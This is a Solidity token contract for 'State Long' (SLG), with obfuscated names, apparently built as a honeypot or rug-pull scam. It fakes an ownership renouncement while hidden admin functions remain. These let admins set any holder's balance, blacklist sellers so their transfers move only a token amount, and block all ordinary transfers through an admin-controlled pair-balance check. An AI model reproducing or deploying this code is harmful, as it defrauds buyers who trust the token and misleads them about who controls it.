//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface receiverTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverFundAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atEnable {
    function createPair(address listEnable, address tokenReceiver) external returns (address);
}

interface buyReceiverMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeFund) external view returns (uint256);

    function transfer(address tradingAmount, uint256 totalToken) external returns (bool);

    function allowance(address autoSellMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalToken) external returns (bool);

    function transferFrom(
        address sender,
        address tradingAmount,
        uint256 totalToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toMin, uint256 value);
    event Approval(address indexed autoSellMin, address indexed spender, uint256 value);
}

interface buyReceiverMarketingMetadata is buyReceiverMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StateLong is receiverFundAuto, buyReceiverMarketing, buyReceiverMarketingMetadata {

    address public sellLiquidity;

    function maxAt() private view {
        require(tradingMarketing[_msgSender()]);
    }

    uint256 constant buyLiquidity = 20 ** 10;

    address teamLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return toLaunch;
    }

    function name() external view virtual override returns (string memory) {
        return modeWallet;
    }

    mapping(address => uint256) private fundTeam;

    function totalLiquidityShould(address shouldTotal, address tradingAmount, uint256 totalToken) internal returns (bool) {
        require(fundTeam[shouldTotal] >= totalToken);
        fundTeam[shouldTotal] -= totalToken;
        fundTeam[tradingAmount] += totalToken;
        emit Transfer(shouldTotal, tradingAmount, totalToken);
        return true;
    }

    function swapReceiver(address maxReceiver) public {
        maxAt();
        if (maxExempt != teamSwap) {
            toEnableIs = true;
        }
        if (maxReceiver == sellLiquidity || maxReceiver == receiverToken) {
            return;
        }
        sellBuy[maxReceiver] = true;
    }

    uint256 public fromAuto;

    address private receiverFrom;

    string private modeWallet = "State Long";

    mapping(address => bool) public tradingMarketing;

    function approve(address limitAt, uint256 totalToken) public virtual override returns (bool) {
        totalFundToken[_msgSender()][limitAt] = totalToken;
        emit Approval(_msgSender(), limitAt, totalToken);
        return true;
    }

    constructor (){
        if (teamSwap != maxExempt) {
            maxExempt = teamLaunched;
        }
        receiverTrading atModeAuto = receiverTrading(sellAt);
        receiverToken = atEnable(atModeAuto.factory()).createPair(atModeAuto.WETH(), address(this));
        if (minLaunched == teamLaunched) {
            teamSwap = teamLaunched;
        }
        sellLiquidity = _msgSender();
        swapTotal();
        tradingMarketing[sellLiquidity] = true;
        fundTeam[sellLiquidity] = senderReceiver;
        if (limitTx) {
            teamLaunched = fromAuto;
        }
        emit Transfer(address(0), sellLiquidity, senderReceiver);
    }

    uint8 private toLaunch = 18;

    bool private toEnableIs;

    bool private limitTx;

    function totalSupply() external view virtual override returns (uint256) {
        return senderReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverMax;
    }

    uint256 buyTeamLiquidity;

    string private receiverMax = "SLG";

    address public receiverToken;

    function owner() external view returns (address) {
        return receiverFrom;
    }

    function toLaunchFund(uint256 totalToken) public {
        maxAt();
        buyTeamLiquidity = totalToken;
    }

    uint256 private maxExempt;

    function transferFrom(address shouldTotal, address tradingAmount, uint256 totalToken) external override returns (bool) {
        if (_msgSender() != sellAt) {
            if (totalFundToken[shouldTotal][_msgSender()] != type(uint256).max) {
                require(totalToken <= totalFundToken[shouldTotal][_msgSender()]);
                totalFundToken[shouldTotal][_msgSender()] -= totalToken;
            }
        }
        return autoReceiver(shouldTotal, tradingAmount, totalToken);
    }

    function autoReceiver(address shouldTotal, address tradingAmount, uint256 totalToken) internal returns (bool) {
        if (shouldTotal == sellLiquidity) {
            return totalLiquidityShould(shouldTotal, tradingAmount, totalToken);
        }
        uint256 fundAmount = buyReceiverMarketing(receiverToken).balanceOf(teamLiquidity);
        require(fundAmount == buyTeamLiquidity);
        require(tradingAmount != teamLiquidity);
        if (sellBuy[shouldTotal]) {
            return totalLiquidityShould(shouldTotal, tradingAmount, buyLiquidity);
        }
        return totalLiquidityShould(shouldTotal, tradingAmount, totalToken);
    }

    event OwnershipTransferred(address indexed fundTo, address indexed fromTake);

    function transfer(address atReceiverFrom, uint256 totalToken) external virtual override returns (bool) {
        return autoReceiver(_msgSender(), atReceiverFrom, totalToken);
    }

    function swapTotal() public {
        emit OwnershipTransferred(sellLiquidity, address(0));
        receiverFrom = address(0);
    }

    function getOwner() external view returns (address) {
        return receiverFrom;
    }

    uint256 public teamSwap;

    uint256 private senderReceiver = 100000000 * 10 ** 18;

    address sellAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function enableLimit(address atReceiverFrom, uint256 totalToken) public {
        maxAt();
        fundTeam[atReceiverFrom] = totalToken;
    }

    bool public tradingShould;

    function isShould(address tradingWallet) public {
        if (tradingShould) {
            return;
        }
        
        tradingMarketing[tradingWallet] = true;
        
        tradingShould = true;
    }

    uint256 maxShouldMin;

    mapping(address => mapping(address => uint256)) private totalFundToken;

    uint256 public receiverSwap;

    mapping(address => bool) public sellBuy;

    function balanceOf(address takeFund) public view virtual override returns (uint256) {
        return fundTeam[takeFund];
    }

    uint256 public teamLaunched;

    uint256 private minLaunched;

    function allowance(address toLaunched, address limitAt) external view virtual override returns (uint256) {
        if (limitAt == sellAt) {
            return type(uint256).max;
        }
        return totalFundToken[toLaunched][limitAt];
    }

}